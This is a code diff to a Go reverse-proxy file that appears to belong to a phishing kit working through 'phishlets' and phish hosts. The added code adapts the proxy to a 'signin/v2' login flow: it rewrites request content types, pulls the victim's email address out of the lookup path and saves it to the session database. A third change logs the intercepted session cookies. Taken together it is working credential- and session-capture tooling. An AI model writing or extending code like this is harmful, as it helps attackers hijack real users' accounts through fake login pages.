@@ -214,6 +214,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
+						 // Inject the following code snippet to check for "signin/v2" in the URL and if it's a POST request
+		       if strings.Contains(req.URL.Path, "signin/v2") && (req.Method == http.MethodPost || req.Method == http.MethodPut){
+		            // Read the request body
+			    log.Info("Found a potential")
+		            bodyBytes, err := ioutil.ReadAll(req.Body)
+		            if err == nil {
+		                // Restore the request body so it can be read again downstream
+		                req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
+
+		                // Check if the body is valid JSON
+		                var jsonCheck map[string]interface{}
+		                if json.Unmarshal(bodyBytes, &jsonCheck) == nil {
+		                    // Set the Content-Type header if body is JSON
+				    log.Info("Changed potential")
+		                    req.Header.Set("Content-Type", "application/json")
+		                }
+		            }
+		        }
+
+
+
+
+
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
 
@@ -661,6 +684,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 
+						// Check if the URL path contains "signin/v2/lookup" and the method is POST
+						if req.Method == http.MethodPost && strings.Contains(req.URL.Path, "signin/v2/lookup") {
+						pathParts := strings.Split(req.URL.Path, "/")
+						if len(pathParts) > 3 {
+						    email := pathParts[len(pathParts)-1]
+						    if strings.Contains(email, "@") {
+							// Set the session username and log the value
+							p.setSessionUsername(ps.SessionId, email)
+							log.Success("[%d] Username: [%s]", ps.Index, email)
+							if err := p.db.SetSessionUsername(ps.SessionId, email); err != nil {
+								log.Error("database: %v", err)
+
+							}
+						    }
+						}
+						}
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
@@ -954,7 +993,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
-
+ log.Debug("Resp Cookies: %s", cookies)
 				// add SameSite=none for every received cookie, allowing cookies through iframes
 				if ck.Secure {
 					ck.SameSite = http.SameSiteNoneMode
